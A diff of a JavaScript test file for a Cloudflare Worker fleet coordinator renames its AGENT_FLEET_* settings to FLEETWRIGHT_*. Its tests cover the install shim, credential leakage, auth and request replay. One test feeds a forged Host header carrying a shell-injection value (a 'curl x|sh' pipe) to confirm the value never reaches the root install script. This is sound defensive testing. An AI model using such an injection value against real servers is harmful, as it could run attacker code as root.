@@ -55,10 +55,10 @@ test('the install one-liner carries this fleet\'s address into the installer', a
   // the person had already given.
   const mine = 'https://raw.githubusercontent.com/someone/theirs/main/install/bootstrap.sh';
   for (const path of ['/install', '/install.sh']) {
-    const res = await get(path, { AGENT_FLEET_INSTALL_URL: mine });
+    const res = await get(path, { FLEETWRIGHT_INSTALL_URL: mine });
     assert.equal(res.status, 200, path);
     const body = await res.text();
-    assert.match(body, /AGENT_FLEET_COORDINATOR_URL='https:\/\/fleet\.example'/, path);
+    assert.match(body, /FLEETWRIGHT_COORDINATOR_URL='https:\/\/fleet\.example'/, path);
     assert.ok(body.includes(mine), `${path} does not fetch the installer`);
     // Never cached: a stale shim is a box pointed at an address this fleet has
     // moved off.
@@ -72,7 +72,7 @@ test('the shim is six lines and no installer, so the source still lives in the r
   // here and cannot be edited here either". That still holds and is the reason
   // this is a bound rather than a preference: everything except the address is
   // fetched, so a coordinator cannot quietly grow an installer.
-  const res = await get('/install', { AGENT_FLEET_INSTALL_URL: 'https://example.invalid/bootstrap.sh' });
+  const res = await get('/install', { FLEETWRIGHT_INSTALL_URL: 'https://example.invalid/bootstrap.sh' });
   const body = await res.text();
   assert.ok(body.split('\n').filter((l) => l.trim() && !l.trim().startsWith('#')).length <= 6,
     'the /install shim has grown installer logic');
@@ -88,7 +88,7 @@ test('/prereq redirects to the prerequisite script beside the installer', async 
   // old reasoning applies in full — served by the place that has the source,
   // so it cannot go stale here and cannot be edited here.
   const res = await get('/prereq', {
-    AGENT_FLEET_INSTALL_URL: 'https://raw.githubusercontent.com/someone/theirs/main/install/bootstrap.sh',
+    FLEETWRIGHT_INSTALL_URL: 'https://raw.githubusercontent.com/someone/theirs/main/install/bootstrap.sh',
   });
   assert.equal(res.status, 302);
   assert.equal(
@@ -101,7 +101,7 @@ test('/prereq redirects to the prerequisite script beside the installer', async 
   // anybody should be able to reach by configuration.
   const unset = await get('/prereq');
   assert.equal(unset.status, 404);
-  assert.match(await unset.text(), /AGENT_FLEET_INSTALL_URL/);
+  assert.match(await unset.text(), /FLEETWRIGHT_INSTALL_URL/);
 });
 
 test('the shim carries an address and never a credential', async () => {
@@ -113,13 +113,13 @@ test('the shim carries an address and never a credential', async () => {
   // coordinator, why not put a token in too" is the obvious next step and it is
   // the one that must never be taken. A static secret served to anybody who
   // curls /install would admit any machine on the internet to the fleet, which
-  // is what AGENT_FLEET_HOST_TOKEN was and why it was removed.
+  // is what FLEETWRIGHT_HOST_TOKEN was and why it was removed.
   const res = await get('/install', {
-    AGENT_FLEET_INSTALL_URL: 'https://example.invalid/bootstrap.sh',
+    FLEETWRIGHT_INSTALL_URL: 'https://example.invalid/bootstrap.sh',
     // Every credential this Worker can see, in case one is ever reached for.
-    AGENT_FLEET_API_TOKEN: 'admin-token-value-here',
-    AGENT_FLEET_GITHUB_CLIENT_SECRET: 'github-secret-value',
-    AGENT_FLEET_AUTH_ALLOW: 'somebody@example.com',
+    FLEETWRIGHT_API_TOKEN: 'admin-token-value-here',
+    FLEETWRIGHT_GITHUB_CLIENT_SECRET: 'github-secret-value',
+    FLEETWRIGHT_AUTH_ALLOW: 'somebody@example.com',
   });
   const body = await res.text();
 
@@ -132,17 +132,17 @@ test('the shim carries an address and never a credential', async () => {
 
   // It sets exactly one variable, and it is the address.
   const assignments = [...body.matchAll(/^([A-Z_]+)=/gm)].map((m) => m[1]);
-  assert.deepEqual(assignments, ['AGENT_FLEET_COORDINATOR_URL']);
+  assert.deepEqual(assignments, ['FLEETWRIGHT_COORDINATOR_URL']);
 });
 
 test('a forged Host header cannot reach the root shell', async () => {
-  // Without AGENT_FLEET_PUBLIC_ORIGIN the origin is whatever the client sent,
+  // Without FLEETWRIGHT_PUBLIC_ORIGIN the origin is whatever the client sent,
   // and it is interpolated into a script that runs as root. normaliseOrigin
   // returns scheme://host:port and nothing else; the charset check is the
   // second lock on the same door.
   const res = await worker.fetch(
     new Request('https://fleet.example/install', { headers: { host: "evil'; curl x|sh; #" } }),
-    /** @type {any} */ ({ FLEET: noFleet, AGENT_FLEET_INSTALL_URL: 'https://example.invalid/b.sh' }),
+    /** @type {any} */ ({ FLEET: noFleet, FLEETWRIGHT_INSTALL_URL: 'https://example.invalid/b.sh' }),
   );
   const body = await res.text();
   assert.equal(/curl x\|sh/.test(body), false, 'a Host header reached the script');
@@ -150,10 +150,10 @@ test('a forged Host header cannot reach the root shell', async () => {
   // And a configured public origin always wins, so a deployment that sets one
   // never depends on the header at all.
   const pinned = await get('/install', {
-    AGENT_FLEET_INSTALL_URL: 'https://example.invalid/b.sh',
-    AGENT_FLEET_PUBLIC_ORIGIN: 'https://fleet.thetech.network',
+    FLEETWRIGHT_INSTALL_URL: 'https://example.invalid/b.sh',
+    FLEETWRIGHT_PUBLIC_ORIGIN: 'https://fleet.thetech.network',
   });
-  assert.match(await pinned.text(), /AGENT_FLEET_COORDINATOR_URL='https:\/\/fleet\.thetech\.network'/);
+  assert.match(await pinned.text(), /FLEETWRIGHT_COORDINATOR_URL='https:\/\/fleet\.thetech\.network'/);
 });
 
 test('an unconfigured coordinator publishes no installer at all', async () => {
@@ -172,7 +172,7 @@ test('an unconfigured coordinator publishes no installer at all', async () => {
   const text = await res.text();
   // NAMES THE VARIABLE and says why it matters, because the person reading this
   // is the one who can set it and "not found" sends them nowhere.
-  assert.match(text, /AGENT_FLEET_INSTALL_URL/);
+  assert.match(text, /FLEETWRIGHT_INSTALL_URL/);
   assert.match(text, /installs the releases of the repository it is served from/);
 });
 
@@ -182,7 +182,7 @@ test('everything else refuses before the object is reached', async () => {
   // Not "we are careful" — the binding above throws, so this asserts that the
   // fleet is unreachable rather than merely unauthorised.
   for (const path of ['/api/hosts', '/api/intent', '/api/clients', '/api/enroll', '/']) {
-    const res = await get(path, { AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' });
+    const res = await get(path, { FLEETWRIGHT_API_TOKEN: 'a-token-at-least-16ch' });
     assert.equal(res.status, 401, path);
   }
 });
@@ -190,7 +190,7 @@ test('everything else refuses before the object is reached', async () => {
 test('with no admin token configured it refuses everything and says which', async () => {
   const res = await get('/api/hosts');
   assert.equal(res.status, 503);
-  assert.match(/** @type {any} */ ((await res.json()).text), /AGENT_FLEET_API_TOKEN/);
+  assert.match(/** @type {any} */ ((await res.json()).text), /FLEETWRIGHT_API_TOKEN/);
 });
 
 test('the admin token gets through, and a wrong one does not', async () => {
@@ -204,7 +204,7 @@ test('the admin token gets through, and a wrong one does not', async () => {
     idFromName: () => 'id',
     get: () => ({ fetch: async () => { reached++; return new Response('{"ok":true}'); } }),
   };
-  const env = { FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' };
+  const env = { FLEET: fleet, FLEETWRIGHT_API_TOKEN: 'a-token-at-least-16ch' };
 
   const good = await worker.fetch(
     new Request('https://fleet.example/api/hosts', { headers: { authorization: 'Bearer a-token-at-least-16ch' } }),
@@ -231,7 +231,7 @@ test('a device credential is passed to the object rather than refused here', asy
   };
   const res = await worker.fetch(
     new Request('https://fleet.example/api/hosts', { headers: { authorization: 'Bearer fwk_abc_def' } }),
-    /** @type {any} */ ({ FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' }),
+    /** @type {any} */ ({ FLEET: fleet, FLEETWRIGHT_API_TOKEN: 'a-token-at-least-16ch' }),
   );
   assert.equal(res.status, 200);
   assert.equal(reached, 1);
@@ -245,7 +245,7 @@ test('host routes reach the object without any token at all', async () => {
     idFromName: () => 'id',
     get: () => ({ fetch: async (/** @type {Request} */ r) => { reached.push(new URL(r.url).pathname); return new Response('{}'); } }),
   };
-  const env = /** @type {any} */ ({ FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' });
+  const env = /** @type {any} */ ({ FLEET: fleet, FLEETWRIGHT_API_TOKEN: 'a-token-at-least-16ch' });
   for (const path of ['/host/connect', '/api/host/challenge', '/api/host/verify', '/api/enroll/host']) {
     await worker.fetch(new Request(`https://fleet.example${path}`), env);
   }
@@ -273,7 +273,7 @@ function wired() {
     fleet,
     env: /** @type {any} */ ({
       FLEET: { idFromName: () => 'id', get: () => fleet },
-      AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch',
+      FLEETWRIGHT_API_TOKEN: 'a-token-at-least-16ch',
     }),
   };
 }
@@ -357,7 +357,7 @@ test('a Durable Object reset replays a safe request instead of failing it', asyn
   };
   const res = await worker.fetch(
     new Request('https://fleet.example/api/host/challenge', { method: 'POST', body: '{"hostId":"deb132"}' }),
-    /** @type {any} */ ({ FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' }),
+    /** @type {any} */ ({ FLEET: fleet, FLEETWRIGHT_API_TOKEN: 'a-token-at-least-16ch' }),
   );
   assert.equal(res.status, 200);
   assert.equal(attempts, 2, 'the request should have been replayed once');
@@ -385,7 +385,7 @@ test('a request that cannot be safely replayed gets 503 and a Retry-After', asyn
       body: '{"verb":"start"}',
       headers: { authorization: 'Bearer a-token-at-least-16ch' },
     }),
-    /** @type {any} */ ({ FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' }),
+    /** @type {any} */ ({ FLEET: fleet, FLEETWRIGHT_API_TOKEN: 'a-token-at-least-16ch' }),
   );
   assert.equal(res.status, 503);
   assert.equal(res.headers.get('retry-after'), '2');
@@ -413,7 +413,7 @@ test('a replay that is reset again answers, rather than becoming a 500', async (
   };
   const res = await worker.fetch(
     new Request('https://fleet.example/api/host/challenge', { method: 'POST', body: '{"hostId":"deb132"}' }),
-    /** @type {any} */ ({ FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' }),
+    /** @type {any} */ ({ FLEET: fleet, FLEETWRIGHT_API_TOKEN: 'a-token-at-least-16ch' }),
   );
   assert.equal(attempts, 2, 'one replay, and not a loop against a deploy in progress');
   assert.equal(res.status, 503);
@@ -439,7 +439,7 @@ test('a real failure during the replay is still raised, not swallowed', async ()
   };
   const res = await worker.fetch(
     new Request('https://fleet.example/api/host/challenge', { method: 'POST', body: '{}' }),
-    /** @type {any} */ ({ FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' }),
+    /** @type {any} */ ({ FLEET: fleet, FLEETWRIGHT_API_TOKEN: 'a-token-at-least-16ch' }),
   );
   assert.equal(attempts, 2);
   // It leaves callFleet as a throw, which the handler below turns into the 500
@@ -469,7 +469,7 @@ test('a real failure is still a real failure', async () => {
   // comes back as an internal error, once.
   const res = await worker.fetch(
     new Request('https://fleet.example/api/host/challenge', { method: 'POST', body: '{}' }),
-    /** @type {any} */ ({ FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' }),
+    /** @type {any} */ ({ FLEET: fleet, FLEETWRIGHT_API_TOKEN: 'a-token-at-least-16ch' }),
   );
   assert.equal(res.status, 500);
   const body = /** @type {any} */ (await res.json());
@@ -499,7 +499,7 @@ test('an unhandled throw answers JSON, not a Cloudflare error page', async () =>
   };
   const res = await worker.fetch(
     new Request('https://fleet.example/api/hosts', { headers: { authorization: 'Bearer a-token-at-least-16ch' } }),
-    /** @type {any} */ ({ FLEET: fleet, AGENT_FLEET_API_TOKEN: 'a-token-at-least-16ch' }),
+    /** @type {any} */ ({ FLEET: fleet, FLEETWRIGHT_API_TOKEN: 'a-token-at-least-16ch' }),
   );
   assert.equal(res.status, 500);
   const body = /** @type {any} */ (await res.json());
